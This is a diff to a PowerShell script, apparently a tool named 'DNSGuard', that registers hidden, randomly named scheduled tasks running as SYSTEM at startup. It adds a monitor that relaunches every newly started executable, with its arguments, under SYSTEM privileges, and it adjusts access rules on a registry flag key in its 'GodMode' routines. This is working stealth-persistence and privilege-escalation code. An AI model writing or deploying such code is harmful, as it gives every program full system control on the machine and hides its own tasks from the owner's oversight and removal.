@@ -1048,6 +1048,16 @@ function Invoke-AsSystem {
     $ResultFile = "$CommonTemp\DNSGuard_Result_$TaskId.txt"
     $BatchFile = "$CommonTemp\DNSGuard_Batch_$TaskId.cmd"
     Write-Log -Message "[DEBUG] Invoke-AsSystem called (TaskId=$TaskId)." -Type "INFO" -Color Yellow
+
+    # Ensure Task Scheduler service is running
+    try {
+        $schedService = Get-Service -Name "Schedule" -ErrorAction SilentlyContinue
+        if ($schedService -and $schedService.Status -ne 'Running') {
+            Start-Service -Name "Schedule" -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 1
+        }
+    } catch {}
+
     try {
         $BatchContent = @"
 @echo off
@@ -1061,8 +1071,9 @@ if %errorlevel% equ 0 (
 "@
         $BatchContent | Out-File -FilePath $BatchFile -Encoding ASCII -Force
         $Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$BatchFile`" > `"$ResultFile`" 2>&1"
-        $Principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
+        $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -TaskName $TempTaskName -Action $Action -Principal $Principal -Force | Out-Null
+        Start-Sleep -Milliseconds 500
         Start-ScheduledTask -TaskName $TempTaskName
         $Waited = 0
         $Completed = $false
@@ -1844,7 +1855,7 @@ function Register-DeepPersistence {
         foreach ($Prefix in $ExtraPrefixes) {
             $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
             $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
-            $trigger = New-ScheduledTaskTrigger -AtLogOn
+            $trigger = New-ScheduledTaskTrigger -AtStartup
             $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
             Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
         }
@@ -2185,12 +2196,17 @@ function Register-StealthTask {
     $action = New-ScheduledTaskAction -Execute "powershell.exe" `
         -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"
 
-    $trigger = New-ScheduledTaskTrigger -AtLogon
+    $trigger = New-ScheduledTaskTrigger -AtStartup
     $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
         -LogonType ServiceAccount -RunLevel Highest
 
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
         -Principal $principal -Force | Out-Null
+
+    # Start the task immediately so monitoring begins now
+    try {
+        Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+    } catch {}
 }
 
 function Unregister-StealthTask {
@@ -2199,21 +2215,43 @@ function Unregister-StealthTask {
 }
 
 function Elevate-Process {
-    param([string]$Path)
+    param(
+        [string]$Path,
+        [string]$Arguments = ""
+    )
     if (-not (Test-Path $Path)) { return }
 
-    Write-Log -Message "Elevating: $Path" -Type "STEALTH" -Color Gray
+    Write-Log -Message "Elevating: $Path $Arguments" -Type "STEALTH" -Color Gray
 
     try {
-        $action = New-ScheduledTaskAction -Execute $Path
+        $action = New-ScheduledTaskAction -Execute $Path -Argument $Arguments
         $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
             -LogonType ServiceAccount -RunLevel Highest
         $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)
 
         Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
         Start-ScheduledTask -TaskName $tempTask
-        Start-Sleep -Milliseconds 400
-        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
+
+        # Wait up to 3 seconds for the task to actually start running
+        $started = $false
+        for ($i = 0; $i -lt 30; $i++) {
+            Start-Sleep -Milliseconds 100
+            $taskInfo = Get-ScheduledTask -TaskName $tempTask -ErrorAction SilentlyContinue
+            if ($taskInfo -and $taskInfo.State -eq "Running") {
+                $started = $true
+                break
+            }
+        }
+
+        # Give the process a moment to initialize before we clean up the task definition
+        if ($started) {
+            Start-Sleep -Seconds 1
+        } else {
+            # Task didn't report as Running; wait a bit more before cleanup
+            Start-Sleep -Seconds 2
+        }
+
+        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false -ErrorAction SilentlyContinue
     } catch {
         Write-Log -Message "Failed to elevate: $Path" -Type "ERROR" -Color Red
     }
@@ -2275,13 +2313,29 @@ function Start-Monitoring {
             foreach ($proc in $newProcesses) {
                 if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
                     $path = $proc.ExecutablePath
+                    $arguments = ""
+                    if ($proc.CommandLine) {
+                        $cmdLine = $proc.CommandLine
+                        # Extract arguments from command line
+                        if ($cmdLine.StartsWith('"')) {
+                            $endQuote = $cmdLine.IndexOf('"', 1)
+                            if ($endQuote -gt 0 -and $endQuote -lt $cmdLine.Length - 1) {
+                                $arguments = $cmdLine.Substring($endQuote + 1).Trim()
+                            }
+                        } else {
+                            $firstSpace = $cmdLine.IndexOf(' ')
+                            if ($firstSpace -gt 0) {
+                                $arguments = $cmdLine.Substring($firstSpace + 1).Trim()
+                            }
+                        }
+                    }
 
                     # Stronger duplicate prevention (60-second cooldown)
                     if (-not $lastElevated.ContainsKey($path) -or 
                         $lastElevated[$path] -lt (Get-Date).AddSeconds(-60)) {
 
                         $lastElevated[$path] = Get-Date
-                        Elevate-Process $path
+                        Elevate-Process -Path $path -Arguments $arguments
                     }
                 }
             }
@@ -2317,7 +2371,7 @@ function Enable-GodMode {
         try {
             $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
             $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ToggleOn"
-            $trigger = New-ScheduledTaskTrigger -AtLogon
+            $trigger = New-ScheduledTaskTrigger -AtStartup
             $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
             Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
             Write-Log -Message "Backup task $taskName registered." -Type "INFO" -Color Gray
@@ -2334,7 +2388,6 @@ function Enable-GodMode {
                 $Acl.Access | ForEach-Object { $Acl.RemoveAccessRule($_) | Out-Null }
                 $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
                 $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "ReadKey", "ContainerInherit,ObjectInherit", "None", "Allow")))
-                $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidUsers, "ReadKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
                 $RegKey.SetAccessControl($Acl)
                 $RegKey.Close()
             }
@@ -2386,6 +2439,20 @@ function Disable-GodMode {
     } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }
 
     Disable-DangerousMode
+
+    # --- Restore flag registry key ACL so it can be re-enabled later ---
+    try {
+        if (Test-Path $GodModeFlagRegPath) {
+            $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
+            if ($RegKey) {
+                $Acl = $RegKey.GetAccessControl()
+                $Acl.SetAccessRuleProtection($false, $false)
+                $Acl.Access | ForEach-Object { $Acl.RemoveAccessRule($_) | Out-Null }
+                $RegKey.SetAccessControl($Acl)
+                $RegKey.Close()
+            }
+        }
+    } catch { Write-Log -Message "Flag registry ACL restore failed: $_" -Type "WARN" -Color Yellow }
 
     # --- Cleanup WMI persistence ---
     try {
